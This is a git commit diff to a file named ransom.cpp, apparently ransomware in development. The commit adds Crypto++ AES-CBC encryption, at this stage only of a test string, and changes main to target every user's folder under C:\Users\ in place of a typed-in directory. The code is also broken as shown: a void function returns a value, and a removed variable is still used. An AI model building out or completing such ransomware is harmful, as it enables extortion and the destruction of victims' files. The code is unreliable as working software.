a839d5915c27bda04c3173bf974498a4dbfbb03c
Steven <osterwald@posteo.de>
2021-10-31 13:32:16 +0100

    aes added

--- ransom.cpp
+++ ransom.cpp
@@ -1,5 +1,12 @@
 // ransom.cpp 
 
+#include "cryptlib.h"
+#include "rijndael.h"
+#include "modes.h"
+#include "files.h"
+#include "osrng.h"
+#include "hex.h"
+
 #include <iostream>
 #include <stdlib.h>
 #include <stdio.h>
@@ -76,16 +83,96 @@ void files_tree(const char* folder) {
 	FindClose(handle);
 }
 
+//aes encryption
+void aesEnc(int argc, char* argv[])
+{
+    using namespace CryptoPP;
 
+    AutoSeededRandomPool prng;
+    HexEncoder encoder(new FileSink(std::cout));
+
+    SecByteBlock key(AES::DEFAULT_KEYLENGTH);
+    SecByteBlock iv(AES::BLOCKSIZE);
+
+    prng.GenerateBlock(key, key.size());
+    prng.GenerateBlock(iv, iv.size());
+
+    std::string plain = "CBC Mode Test";
+    std::string cipher, recovered;
+
+    std::cout << "plain text: " << plain << std::endl;
+
+    /*********************************\
+    \*********************************/
+
+    try
+    {
+        CBC_Mode< AES >::Encryption e;
+        e.SetKeyWithIV(key, key.size(), iv);
+
+        StringSource s(plain, true, 
+            new StreamTransformationFilter(e,
+                new StringSink(cipher)
+            ) // StreamTransformationFilter
+        ); // StringSource
+    }
+    catch(const Exception& e)
+    {
+        std::cerr << e.what() << std::endl;
+        exit(1);
+    }
+
+    /*********************************\
+    \*********************************/
+
+    std::cout << "key: ";
+    encoder.Put(key, key.size());
+    encoder.MessageEnd();
+    std::cout << std::endl;
+
+    std::cout << "iv: ";
+    encoder.Put(iv, iv.size());
+    encoder.MessageEnd();
+    std::cout << std::endl;
+
+    std::cout << "cipher text: ";
+    encoder.Put((const byte*)&cipher[0], cipher.size());
+    encoder.MessageEnd();
+    std::cout << std::endl;
+    
+    /*********************************\
+    \*********************************/
+
+    try
+    {
+        CBC_Mode< AES >::Decryption d;
+        d.SetKeyWithIV(key, key.size(), iv);
+
+        StringSource s(cipher, true, 
+            new StreamTransformationFilter(d,
+                new StringSink(recovered)
+            ) // StreamTransformationFilter
+        ); // StringSource
+
+        std::cout << "recovered text: " << recovered << std::endl;
+    }
+    catch(const Exception& e)
+    {
+        std::cerr << e.what() << std::endl;
+        exit(1);
+    }
+
+    return 0;
+}
 
 //main
 int main() {
-	string directoryName;
+	//encrypt only users dir
+	string directoryUsers = "C:\\Users\\";
 
-	cout << "Enter dir to encrypt: ";
-	cin >> directoryName;
-	fflush(stdin);
-	//encryptDirectory(directoryName);
+	//cout << "Enter dir to encrypt: ";
+	//cin >> directoryName;
+	//fflush(stdin);
 
 	std::string str;
 	const char* c = directoryName.c_str();
